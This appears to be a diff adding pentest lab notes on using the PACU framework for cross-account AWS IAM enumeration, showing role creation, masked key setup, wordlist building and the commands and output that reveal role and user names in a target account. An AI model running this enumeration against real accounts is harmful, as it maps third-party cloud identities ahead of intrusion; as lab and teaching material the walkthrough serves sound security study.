@@ -1,0 +1,108 @@
+⬛️ PACU: IAM Cross Account Enumeration
+   -> Using PACU, enum the users and roles on the AWS account 2767XXXXXXXXX
+
+
+# Create a role in the AWS account for further enumeration
+nano assume-role-doc.json
+
+aws iam create-role --role-name a4 --assume-role-policy-document file:///home/kali/AWS/assume-role-doc.json
+
+
+# Use PACU to enum role on other AWS accounts 
+
+ - Open PACU & start a new PACU session & configure access keys
+sudo apt install pacu
+
+
+ - Choose set_keys  
+        Add a set of AWS keys to the session and set them as the default
+
+Pacu (1:No Keys Set) > set_keys
+
+Key alias [None]: awstest
+Access key ID [None]: AKIATNQXXXXXXXXXXXXXXXXX
+Secret access key [None]: 76b1AaWIXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Session token (Optional - for temp AWS keys only) [None]:
+
+Keys saved to database.
+
+Pacu (1:awstest) > ___________
+Pacu (1:awstest) > list                - Check for roles enum module in module list
+Pacu (1:awstest) > iam__enum__roles    - requires a WORDLIST for enum
+
+nano names.txt
+ox
+ant
+ape
+asp
+bat
+bee
+boa
+bug
+cat
+cod
+>>>
+
+- Modify names.txt to prefix "ad-" before each payload
+sed -i 's/^/ad-/g' names.txt
+
+nano names.txt
+ad-ox
+ad-ant
+ad-ape
+ad-asp
+ad-bat
+ad-bee
+ad-boa
+ad-bug
+ad-cat
+ad-cod
+>>>
+
+ - Run PACU role enum module
+
+Pacu (1:awstest) > run iam__enum_roles --role-name a4 --account-id 27638XXXXX22 --word-list /home/kali/AWS/names.txt
+  
+Running module iam__enum_roles...
+
+[iam__enum_roles] Warning: This script does not check if the keys you supplied have the correct permissions. 
+Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name 
+and are allowed to use sts:AssumeRole to try and assume any enumerated roles!
+
+[iam__enum_roles] Targeting account ID: 2763XXXXXX22
+
+[iam__enum_roles] Starting role enumeration...
+
+[iam__enum_roles]   Found role: arn:aws:iam::27XXXXXX7722:role/ad-crow
+[iam__enum_roles]   Found role: arn:aws:iam::2763XXXXXX22:role/ad-flea
+[iam__enum_roles]   Found role: arn:aws:iam::276XXXXX7722:role/ad-ibex
+[iam__enum_roles]   Found role: arn:aws:iam::276XXXXXX722:role/ad-snipe
+[iam__enum_roles]   Found role: arn:aws:iam::276XXXXXXX22:role/ad-griffon
+
+5 roles found on target account
+
+
+ - Run PACU user enum module
+
+Pacu (1:awstest) > run iam__enum_users --role-name a4 --account-id 2763XXXXXX22 --word-list /home/kali/AWS/names.txt
+  
+Running module iam__enum_users...
+
+[iam__enum_users] Warning: This script does not check if the keys you supplied have the correct permissions. 
+                           Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!
+
+[iam__enum_users] Targeting account ID: 276XXXXXXXXXX2
+
+[iam__enum_users] Starting user enumeration...
+
+[iam__enum_users]     arn:aws:iam::27XXXXXXX722:user/ad-ghoul
+[iam__enum_users]     arn:aws:iam::276384XXXXX22:user/ad-guppy
+[iam__enum_users]     arn:aws:iam::276XXXXXX722:user/ad-marmot
+[iam__enum_users]     arn:aws:iam::2763XXXXXX22:user/ad-thrush
+[iam__enum_users]     arn:aws:iam::27XXXXXXXX22:user/ad-haddock
+[iam__enum_users]     arn:aws:iam::27XXXXXXXX22:user/ad-foxhound
+[iam__enum_users]     arn:aws:iam::276XXXXXX722:user/ad-honeybee
+[iam__enum_users]     arn:aws:iam::2763XXXXXX22:user/ad-terrapin
+
+
+8 user(s) found after 456 guess(es)
